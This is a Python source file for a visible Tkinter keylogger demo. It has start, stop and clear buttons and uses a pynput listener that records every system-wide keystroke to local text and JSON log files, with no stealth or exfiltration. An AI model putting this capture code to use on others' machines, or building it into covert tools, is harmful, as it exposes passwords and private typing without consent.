import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("550x400")
root.title("Keylogger Page")
root.configure(bg="Lightgrey")

key_list = []
x = False
key_strokes = ""
listener = None   # for start/stop control

# ---------------- FILE FUNCTIONS ----------------
def update_txt_file(key):
    with open('logs.txt', 'a') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        key_list_bytes = json.dumps(key_list)
        key_log.write(key_list_bytes)

# ---------------- KEYLOGGER FUNCTIONS ----------------
def on_press(key):
    global x, key_list

    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True

    if x == True:
        key_list.append({'Held': f'{key}'})

    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes

    key_list.append({'Released': f'{key}'})

    if x == True:
        x = False

    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

# ---------------- BUTTON FUNCTIONS ----------------
def start_keylogger():
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Status: Running")
        print("[+] Keylogger Started")

def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        listener = None
        status_label.config(text="Status: Stopped")
        print("[!] Keylogger Stopped")

def clear_logs():
    open('logs.txt', 'w').close()
    open('logs.json', 'w').close()
    print("[*] Logs Cleared")

# ---------------- UI DESIGN ----------------
root.grid_columnconfigure(0, weight=1)

Label(root, text="Keylogger", font=("Verdana", 16, "bold"), bg="Lightgrey")\
    .grid(row=0, column=0, pady=(30, 20))

Button(root, text="Start Keylogger", width=20, bg="green", fg="white",
       command=start_keylogger)\
    .grid(row=1, column=0, pady=5)

Button(root, text="Stop Keylogger", width=20, bg="red", fg="white",
       command=stop_keylogger)\
    .grid(row=2, column=0, pady=5)

Button(root, text="Clear Logs", width=20,
       command=clear_logs)\
    .grid(row=3, column=0, pady=10)

# Status Label
status_label = Label(root, text="Status: Idle", bg="Lightgrey", font=("Arial", 10))
status_label.grid(row=4, column=0, pady=10)

root.mainloop()
